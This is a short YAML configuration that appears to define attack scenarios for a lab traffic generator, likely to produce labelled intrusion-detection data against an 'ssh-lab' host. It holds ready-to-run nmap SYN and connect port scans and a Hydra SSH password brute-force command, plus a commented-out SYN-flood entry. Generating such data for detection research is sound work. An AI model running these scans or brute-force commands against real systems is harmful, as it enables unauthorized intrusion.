ssh:
  - name: "PortScan - TCP SYN scan on SSH"
    destination: "ssh"
    category: "PortScan"
    intensity: "low"
    # command: "nmap -sS -p 22 ssh-lab"
    command: "nmap -sS -p 1-1000 ssh-lab"

  - name: "PortScan - full TCP connect scan"
    destination: "ssh"
    category: "PortScan"
    intensity: "medium"
    command: "nmap -sT -p 1-1000 ssh-lab"

  - name: "SSH brute-force with Hydra"
    destination: "ssh"
    category: "SSH-Patator"
    intensity: "high"
    command: "hydra -t 4 -L /wordlists/usernames.txt -P /wordlists/passwords.txt 172.18.0.4 -s 22 ssh"

  # - name: "DoS - SYN flood using hping3"
